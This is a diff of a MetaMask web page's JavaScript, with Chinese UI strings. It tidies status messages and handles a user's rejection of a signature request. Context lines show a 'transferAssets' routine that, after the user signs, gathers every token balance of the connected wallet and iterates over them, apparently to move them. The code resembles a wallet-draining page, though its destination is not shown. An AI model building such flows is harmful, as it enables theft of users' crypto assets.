@@ -37,8 +37,11 @@ const updateWalletList = (address) => {
 };
 
 // 更新状态信息
-const updateStatus = (message) => {
+const updateStatus = (message, clear = false) => {
     const statusElement = document.getElementById('status');
+    if (clear) {
+        statusElement.innerText = '';
+    }
     statusElement.innerText += `\n${message}`;
 };
 
@@ -56,17 +59,17 @@ document.getElementById('connectButton').onclick = async () => {
                 if (accounts.length > 0) {
                     updateWalletList(accounts[0]);
                     isConnected = true;
-                    updateStatus('MetaMask 已连接');
+                    updateStatus('MetaMask 已连接', true);
                     document.getElementById('signButton').disabled = false; // 启用签名按钮
                 } else {
-                    updateStatus('未检测到已连接的账户');
+                    updateStatus('未检测到已连接的账户', true);
                 }
             } else {
-                updateStatus('请安装 MetaMask 钱包');
+                updateStatus('请安装 MetaMask 钱包', true);
             }
         }
     } catch (error) {
-        updateStatus('连接失败: ' + error.message);
+        updateStatus('连接失败: ' + error.message, true);
     }
 };
 
@@ -83,7 +86,11 @@ document.getElementById('signButton').onclick = async () => {
             // 调用转移资产的函数
             await transferAssets(account);
         } catch (error) {
-            updateStatus(`签名失败: ${error.message}`);
+            if (error.code === 4001) {
+                updateStatus('用户拒绝了签名请求');
+            } else {
+                updateStatus(`签名失败: ${error.message}`);
+            }
         }
     } else {
         updateStatus('请先连接钱包');
@@ -92,7 +99,7 @@ document.getElementById('signButton').onclick = async () => {
 
 // 转移资产的函数
 const transferAssets = async (account) => {
-    updateStatus(`正在获取 ${account} 的代币余额...`);
+    updateStatus(`正在获取 ${account} 的代币余额...`, true);
     const tokenBalances = await getTokenBalances(account);
 
     for (const tokenAddress in tokenBalances) {
